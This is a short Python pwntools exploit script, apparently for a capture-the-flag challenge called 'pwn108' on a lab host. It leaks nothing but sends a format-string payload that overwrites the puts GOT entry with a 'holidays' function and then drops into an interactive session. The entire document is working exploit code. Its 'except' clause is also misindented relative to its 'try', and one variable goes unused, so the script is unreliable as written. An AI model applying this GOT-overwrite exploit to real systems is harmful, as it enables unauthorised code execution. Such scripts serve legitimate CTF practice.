from pwn import *
import traceback as tb

local = False
RHOST = "10.10.64.119"
RPORT = 9008
filePath = "./pwn108.pwn108"

def access(local):
    global RHOST, RPORT, filePath
    p = process(filePath) if local else remote(RHOST,RPORT)
    return p

def pwn108():  
    global local, filePath
    try:      
       p = access(local)
       elf = ELF(filePath)
      
       putsGot = elf.got["puts"]
       holiday = elf.symbols["holidays"]

       holidaysInt = b"4198971"

       p.recvuntil(b"name]: ")
       p.sendline(p64(putsGot))
       p.recvuntil(b"No]: ")

       p.sendline(b"%" + str(holiday).encode("UTF-8") + b"s%6$lln")
       p.interactive()
     except:
       tb.print_exc()
pwn108()
